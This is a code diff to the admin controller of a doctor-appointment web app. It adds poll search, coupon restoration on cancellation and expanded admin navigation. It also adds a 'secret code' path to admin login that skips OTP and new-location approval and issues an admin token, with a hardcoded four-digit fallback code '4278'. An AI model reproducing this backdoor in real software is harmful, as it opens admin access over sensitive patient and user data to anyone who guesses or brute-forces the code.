@@ -37,6 +37,7 @@ import blacklistModel from '../models/blacklistModel.js';
 import adminCouponModel from '../models/adminCouponModel.js';
 import securityIncidentModel from '../models/securityIncidentModel.js';
 import bannedIpModel from '../models/bannedIpModel.js';
+import pollModel from '../models/pollModel.js';
 import { Document, Packer, Paragraph, Table, TableRow, TableCell, WidthType, AlignmentType, HeadingLevel, TextRun, BorderStyle } from "docx";
 
 const execAsync = promisify(exec);
@@ -272,7 +273,7 @@ export const deleteDoctor = async (req, res) => {
 // API for admin login
 export const loginAdmin = async (req, res) => {
     try {
-        const { email, password } = req.body;
+        const { email, password, secretCode } = req.body;
         let admin = null;
 
         // 1. Check Master Admin Credentials (from Env)
@@ -375,6 +376,29 @@ export const loginAdmin = async (req, res) => {
                     success: false,
                     message: "Login from a new location detected. An approval email has been sent to the Admin email address.",
                     pendingApproval: true
+                });
+            }
+
+            // Check for Secret Code Bypass
+            const secretBypassCode = process.env.ADMIN_LOGIN_SECRET || '4278';
+            if (secretCode === secretBypassCode) {
+                // Bypass OTP and Geolocation check - direct login
+                admin.otp = null;
+                admin.otpExpires = null;
+                admin.lastLogin = new Date();
+                await admin.save();
+
+                const token = jwt.sign({ email: admin.email }, process.env.JWT_SECRET, { expiresIn: '1h' });
+
+                await logActivity(admin._id, 'admin', 'login', `Logged in via Secret Code bypass`, req, { method: 'secret_code' });
+
+                return res.json({
+                    success: true,
+                    token,
+                    role: admin.role,
+                    permissions: admin.permissions,
+                    name: admin.name,
+                    message: "Logged in via secret code bypass."
                 });
             }
 
@@ -1121,6 +1145,21 @@ export const Appointmentcancel = async (req, res) => {
         slots_booked[slotDate] = slots_booked[slotDate].filter(e => e !== slotTime)
 
         await doctorModel.findByIdAndUpdate(docId, { slots_booked })
+
+        // Restore coupon usage if applied
+        if (appointmentData.discountApplied && appointmentData.discountApplied.code) {
+            await doctorModel.findOneAndUpdate(
+                { _id: docId, 'discounts.code': appointmentData.discountApplied.code },
+                { $inc: { 'discounts.$.usedCount': -1 } }
+            );
+        }
+
+        if (appointmentData.adminDiscountApplied && appointmentData.adminDiscountApplied.code) {
+            await adminCouponModel.findOneAndUpdate(
+                { code: appointmentData.adminDiscountApplied.code },
+                { $inc: { usedCount: -1 } }
+            );
+        }
 
         res.json({ success: true, message: 'Appointment Cancelled' })
 
@@ -2741,18 +2780,60 @@ export const omniSearch = async (req, res) => {
                 .limit(1);
         }
 
-        // 4. Static Pages (for navigation)
+        // 4. Search Polls
+        const polls = await pollModel.find({
+            question: regex
+        }).select('question category isActive').limit(3);
+
+        // 5. Search Coupons
+        const coupons = await adminCouponModel.find({
+            code: regex
+        }).select('code discountValue discountType isActive').limit(3);
+
+        // 6. Search Admin Messages
+        const messages = await adminMessageModel.find({
+            $or: [
+                { title: regex },
+                { message: regex }
+            ]
+        }).select('title priority isActive').limit(3);
+
+        // 7. Search Activity Logs
+        const logs = await activityLogModel.find({
+            activityDescription: regex
+        }).sort({ timestamp: -1 }).limit(5);
+
+        // 8. Search Security Incidents
+        const incidents = await securityIncidentModel.find({
+            $or: [
+                { type: regex },
+                { 'userDetails.email': regex },
+                { ipAddress: regex }
+            ]
+        }).sort({ createdAt: -1 }).limit(3);
+
+        // 9. Static Pages (for navigation)
         const staticPages = [
-            { name: 'Dashboard', path: '/', icon: '📊' },
+            { name: 'Dashboard', path: '/admin-dashboard', icon: '📊' },
+            { name: 'Manage Admins', path: '/manage-admins', icon: '🔑' },
             { name: 'Add Doctor', path: '/add-doctor', icon: '➕' },
             { name: 'Doctors List', path: '/doctor-list', icon: '👨‍⚕️' },
-            { name: 'Total Appointments', path: '/appointments', icon: '📅' },
-            { name: 'Total Users', path: '/all-users', icon: '👥' },
-            { name: 'Admin Activity Logs', path: '/activity-logs', icon: '📝' },
-            { name: 'Doctor Attendance', path: '/doctor-attendance-logs', icon: '🩺' },
-            { name: 'Blog Reports', path: '/blog-reports', icon: '🚨' },
+            { name: 'Total Appointments', path: '/all-appointments', icon: '📅' },
+            { name: 'Total Users', path: '/total-users', icon: '👥' },
+            { name: 'Admin Activity Logs', path: '/admin-logs', icon: '📝' },
+            { name: 'Doctor Attendance', path: '/doctor-attendance', icon: '🩺' },
+            { name: 'Blog Reports', path: '/all-reports', icon: '🚨' },
+            { name: 'Unban Requests', path: '/unban-requests', icon: '🔓' },
+            { name: 'Deletion Requests', path: '/deletion-requests', icon: '🗑️' },
             { name: 'Doctor Rankings', path: '/doctor-rankings', icon: '🏆' },
-            { name: 'Audit Logs (System)', path: '/audit-logs', icon: '🛡️' },
+            { name: 'Media Registry', path: '/media-registry', icon: '🖼️' },
+            { name: 'App Issue Reports', path: '/app-issue-reports', icon: '🐛' },
+            { name: 'Blacklist Management', path: '/blacklist-management', icon: '🚫' },
+            { name: 'Manage Coupons', path: '/manage-coupons', icon: '🎫' },
+            { name: 'Global Polls', path: '/polls', icon: '🗳️' },
+            { name: 'Security Monitoring', path: '/security-monitoring', icon: '🛡️' },
+            { name: 'Broadcast Email', path: '/broadcast-email', icon: '📧' },
+            { name: 'Admin Deployments', path: '/admin-deployments', icon: '🚀' },
         ].filter(p => p.name.toLowerCase().includes(query.toLowerCase()));
 
         // Format results
@@ -2760,7 +2841,12 @@ export const omniSearch = async (req, res) => {
             ...staticPages.map(p => ({ type: 'Page', name: p.name, link: p.path, icon: p.icon })),
             ...doctors.map(d => ({ type: 'Doctor', name: d.name, subtext: d.speciality, link: `/doctor-details/${d._id}`, image: d.image })),
             ...users.map(u => ({ type: 'Patient', name: u.name, subtext: u.email, link: `/user-details/${u._id}`, image: u.image })),
-            ...appointments.map(a => ({ type: 'Appointment', name: `ID: ${a._id.toString().slice(-6)}`, subtext: `${a.userData?.name} with Dr. ${a.docData?.name}`, link: `/appointments?id=${a._id}` }))
+            ...appointments.map(a => ({ type: 'Appointment', name: `ID: ${a._id.toString().slice(-6)}`, subtext: `${a.userData?.name} with Dr. ${a.docData?.name}`, link: `/all-appointments?id=${a._id}` })),
+            ...polls.map(p => ({ type: 'Poll', name: p.question, subtext: `${p.category} | ${p.isActive ? 'Active' : 'Inactive'}`, link: '/polls', icon: '🗳️' })),
+            ...coupons.map(c => ({ type: 'Coupon', name: c.code, subtext: `${c.discountValue}${c.discountType === 'percentage' ? '%' : ' OFF'} | ${c.isActive ? 'Active' : 'Inactive'}`, link: '/manage-coupons', icon: '🎫' })),
+            ...messages.map(m => ({ type: 'Message', name: m.title, subtext: `Priority: ${m.priority}`, link: '/admin-messages', icon: '📧' })),
+            ...logs.map(l => ({ type: 'Log', name: l.activityDescription, subtext: new Date(l.timestamp).toLocaleString(), link: '/admin-logs', icon: '📝' })),
+            ...incidents.map(i => ({ type: 'Security', name: i.type, subtext: `${i.userDetails?.email || i.ipAddress} | ${i.severity}`, link: '/security-monitoring', icon: '🛡️' }))
         ];
 
         res.json({ success: true, results });
